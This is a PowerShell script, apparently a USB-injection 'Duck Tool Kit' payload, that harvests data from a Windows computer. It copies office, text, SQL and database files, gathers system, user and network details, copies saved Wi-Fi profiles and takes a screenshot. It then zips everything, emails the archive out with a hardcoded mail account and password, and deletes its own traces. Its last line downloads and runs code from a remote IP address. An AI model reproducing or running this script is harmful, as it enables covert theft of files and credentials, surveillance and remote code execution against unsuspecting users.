

$folderDateTime = (get-date).ToString('d-M-y HHmmss')

$userDir = (Get-ChildItem env:\userprofile).value + '\Report ' + $folderDateTime

$fileSaveDir = New-Item  ($userDir) -ItemType Directory


$copyDir = 'G:\'

$copyToDir = New-Item $fileSaveDir'\Doc' -ItemType Directory

Dir -filter *.txt -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.doc -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.sql -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.mdb -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}



#(new-object System.Net.WebClient).DownloadFile('http://wpbkt.oss-cn-hangzhou.aliyuncs.com/GetPass.ps1','D:\GetPass.ps1');
#D:\GetPass.ps1;
$object2 = (Get-ChildItem env:\username).value + ' Report.zip'
$date = get-date

$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"

$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html'

$Report = $Report +"<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>"

$SysBootTime = Get-WmiObject Win32_OperatingSystem 

$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime 

$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME) 

$SerialNo = $SysSerialNo.SerialNumber 

$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model 

$SysManufacturer = $SysInfo.Manufacturer 

$SysModel = $SysInfo.Model

$OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption

$disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"

$HD = [math]::truncate($disk.Size / 1GB)

$FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)

$SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize

$Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)

$SysCpu = Get-WmiObject Win32_Processor | Select Name

$Cpu = $SysCpu.Name

$HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber

$HardSerialNo = $HardSerial.SerialNumber

$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name

$graphicsCard = gwmi win32_VideoController |select Name

$graphics = $graphicsCard.Name

$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1

$DriveLetter = $CDDrive.Drive

$DriveName = $CDDrive.Caption

$Disk = $DriveLetter + '' + $DriveName

$Firewall = New-Object -com HNetCfg.FwMgr 

$FireProfile = $Firewall.LocalPolicy.CurrentProfile 

$FireProfile = $FireProfile.FirewallEnabled

$Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"

$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired 

$UserType = $UserInfo.AccountType

$UserSid = $UserInfo.SID

$UserPass = $UserInfo.PasswordRequired

$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')

$Report =  $Report +"<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 

$Report = $Report + '</div>'

$Report =  $Report + '<div id=center><h3> Installed Programs</h3> '

$Report =  $Report + (Get-WmiObject -class Win32_Product | ConvertTo-html  Name, Version,InstallDate)

$Report = $Report + '</table></div>'

$Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>'

$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.xls, *.xlsx, *.txt -Recurse |convertto-html Directory, Name, LastAccessTime)

$Report = $Report + '</div>'

$Report =  $Report + '<div id=center><h3>Network Information</h3>'

$Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html)

$Report = $Report + '</table></div>'

$wlanSaveDir = New-Item $userDir'/Duck/WLAN_PROFILES' -ItemType Directory 

$srcDir = 'C:/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces' 

Copy-Item $srcDir $wlanSaveDir -Recurse 

$jpegSaveDir = New-Item $fileSaveDir'/Screenshots' -ItemType Directory 

$displayInfo = Get-WmiObject Win32_DesktopMonitor | Where {$_.Name -eq 'Default Monitor'}| Select ScreenHeight, ScreenWidth 

$displayWidth = $displayInfo.ScreenWidth 

$displayHeight = $displayInfo.ScreenHeight 

[System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

$jpegName = (get-date).ToString('HHmmss') 
$image = new-object System.Drawing.Bitmap 1920 ,1080
$imageSize = New-object System.Drawing.Size $displayWidth,$displayHeight
$screen = [System.Drawing.Graphics]::FromImage($image) 
$screen.copyfromscreen(0,0,0,0, $imageSize,([System.Drawing.CopyPixelOperation]::SourceCopy)) 
$image.Save("$jpegSaveDir/$jpegName.jpeg",([system.drawing.imaging.imageformat]::jpeg)); 

$Report >> $fileSaveDir'/ComputerInfo.html'
#copy D:\sd.txt $fileSaveDir'/Getpass.txt'
function copy-ToZip($fileSaveDir){

$srcdir = $fileSaveDir

$zipFile = 'D:\Report.zip'

if(-not (test-path($zipFile))) {

set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))

(dir $zipFile).IsReadOnly = $false}

$shellApplication = new-object -com shell.application

$zipPackage = $shellApplication.NameSpace($zipFile)

$files = Get-ChildItem -Path $srcdir

foreach($file in $files) {

$zipPackage.CopyHere($file.FullName)

while($zipPackage.Items().Item($file.name) -eq $null){

Start-sleep -seconds 1 }}}

copy-ToZip($fileSaveDir)

$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
$mail.From = New-Object System.Net.Mail.MailAddress('2014652020@email.ctbu.edu.cn','2014652020@email.ctbu.edu.cn')
$mail.To.Add('2014652020@email.ctbu.edu.cn')
#set the content
$mail.Subject = 'D'
$mail.Priority  = 'High'
$mail.Body = 'test'
$filename= 'D:\Report.zip'
$attachment = new-Object System.Net.Mail.Attachment($filename)
$mail.Attachments.Add($attachment)
#send the message
$smtp = New-Object System.Net.Mail.SmtpClient -argumentList 'pop.exmail.qq.com'
$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList '2014652020@email.ctbu.edu.cn','Inctbu123'
$smtp.EnableSsl = 'True';
$smtp.Timeout = '10000000';
try{
	$smtp.Send($mail)
	echo 'Ok,Send succed!'
}
catch 
{
	echo 'Error!Filed!'
}
remove-item $fileSaveDir -recurse

remove-item 'D:\Report.zip'
remove-item 'D:\runcmd.bat'
Remove-Item $MyINvocation.InvocationName

IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))


